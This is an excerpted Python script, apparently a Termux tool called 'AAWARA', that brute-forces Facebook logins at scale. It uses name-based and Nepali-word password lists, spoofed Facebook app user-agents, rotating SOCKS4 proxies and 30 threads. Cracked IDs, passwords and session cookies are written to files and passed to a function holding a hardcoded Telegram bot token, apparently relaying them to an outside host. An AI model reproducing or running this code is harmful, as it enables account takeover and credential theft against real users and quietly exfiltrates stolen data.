...
try:
        ...
        os.system('python AAWARA.py')
except:pass

def Elite(ids,pas,cookie):
    try:
        import requests
        token = "6805474179:AAFv-FiZPKZ-O2jSjX8olWxNfnLnpUu_H0o"
        chatid = ""
...
def es():
      if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
           ...
           system('clear');print('System Modification Not Allowed since using sisir');exit()
...
def joined(ids):
    ...
    return creation  
os.system("xdg-open https://chat.whatsapp.com/F19SQdajVUC4AMsmvaCQDz")        
def getKey():
...
| $$  | $$| $$  | $$| $$$/ \  $$$| $$  | $$| $$  \ $$| $$  | $$      | $$      | $$  | $$| $$$/ \  $$$| $$\  $$$| $$  | $$| $$  | $$
| $$  | $$| $$  | $$| $$/   \  $$| $$  | $$| $$  | $$| $$  | $$      | $$$$$$$$|  $$$$$$/| $$/   \  $$| $$ \  $$| $$$$$$$/| $$  | $$
|__/  |__/|__/  |__/|__/     \__/|__/  |__/|__/  |__/|__/  |__/      |________/ \______/ |__/     \__/|__/  \__/|_______/ |__/  |__/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗ 
║ [●]  ᴀᴜᴛʜᴏʀ        :    𝗔𝗔𝗪𝗔𝗥𝗔 𝗟𝗢𝗪𝗡𝗗𝗔       ║ 
║ [●]  ғᴀᴄᴇʙᴏᴏᴋ      :          𝗥𝗕   ║    
║ [●]  ɢɪᴛʜᴜʙ        :  𝗔𝗔𝗪𝗔𝗥𝗔-𝗖𝗬𝗕𝗘𝗥         ║   
║ [●]  sᴛᴀᴛᴜs        :          P⃠ＡＩＤ       ║   
║ [●]  𝚅𝙴𝚁𝚂𝙸𝙾𝙽       :             4.3        ║ 
...
def za():
    ...
    if myid in str(content):
        ...
        os.system("xdg-open https://wa.me/+9779741861606")
                          ...
                          #      verf()	
                                ...
                                if psx in ['1','01']:
                                        ...
                                        try:
                                                ...
                                                ps_limit =1
                                        linex()
                                        print(' exp: first last,firstlast,first123')
                                        linex()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(f"\rSPEED BOOST ON/OFF AIRPLANE MODE 🚀 ")
                                        linex()
                                        for user in fo:
...
def npxind():
                user=[]
                clear()
                print('\033[1;37m Example : 9823,9816,9814,ETC')
                linex()
                ...
                with tred(max_workers=30) as sisir:     
                        ...
                        for psx in user:
                                ...
                                if pcs in ['5','05']:                                   
                                    ...
                                    passlist = [psx,ids,'kathmandu','nepal123','magar','magar123','tamang','tamang123','pokhara','maya','maya123','pokhara12','gurung','kumari','kathmandu12']
                                if mthd in ['9','09']:                                 
...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [AAWARA-XD] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Vivo;FBBD/Vivo;FBPN/{fbpn};FBDV/V1938T;FBSV/10;nullFBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [AAWARA-OK] '+str(uid)+' | '+pas+' ''\033[1;97m')
                                        open('/sdcard/AAWARA_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/AAWARA_COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[AAWARA-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                              #  print('\r\r\x1b[1;91m [AAWARA-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AAWARA-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/AAWARA-BRAND-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
...
def M2(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])          
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/xiaomi;FBBD/xiaomi;FBPN/com.facebook.orca;FBDV/23073RPBFG;FBSV/13;nullFBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                nip=random.choice(proxsi)
                                proxs= {'http': 'socks4://'+nip}
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [AAWARA-OK] '+str(uid)+' | '+pas+' ''\033[1;97m')
                                        print("\033[1;32m [🍪] :\033[1;35m "+cookie)
                                        open('/sdcard/AAWARA_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/AAWARA_COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
...
def M3(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])          
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.orca;FBDV/SM-S916B;FBSV/14;nullFBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                nip=random.choice(proxsi)
                                proxs= {'http': 'socks4://'+nip}
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [AAWARA-OK] '+str(uid)+' | '+pas+' ''\033[1;97m')
                                        print("\033[1;32m [🍪] :\033[1;34m "+cookie)
                                        open('/sdcard/AAWARA_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/AAWARA_COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
...
def rndm1(ids,passlist):
        global loop
        global oks,cps
        sys.stdout.write('\r\r\033[1;32m [AAWARA-RNDM] %s|OK-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/en_US;FBCR/Etisalat;FBMF/Tecno;FBBD/Tecno;FBDV/TECNO LH6n;FBSV/13;FBCA/armeabi-v8a:armeabi;FBDM/"+"{density=2.0,width=720,height=1440};FB_FW/1;]"
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/AAWARA_COOKIE.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/AAWARA-R-XD-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                ...
                                if uid in oks:pass
                                     ...
                                     #   print('\r\r\x1b[38;5;208m [AAWARA-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AAWARA-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def rndm(ids,passlist):
        global loop
        global oks,cps
        sys.stdout.write('\r\r\033[1;37m [AAWARA-RNDM] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'                        
                        facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
                        ...
                        fban = random.choice(["FB4A", "FB5A", "FB6A"])
                        fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
                        ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/en_US;FBCR/Etisalat;FBMF/Tecno;FBBD/Tecno;FBDV/TECNO BD1;FBSV/11;FBCA/armeabi-v8a:armeabi;FBDM/"+"{density=2.0,width=720,height=1440};FB_FW/1;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"  
                                        print('\r\r\033[1;32m [AAWARA-OK] '+str(uid)+' | '+pas+' ''\033[1;97m')
                                        print("\033[1;37m [🍪] :\033[1;34m "+cookie)
                                        print(f"\r\r\033[1;37m Ph no. = "+ids)
                                        open('/sdcard/AAWARA_COOKIE.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                       ...
                                       # print('\r\r\x1b[1;91m [AAWARA-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AAWARA-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
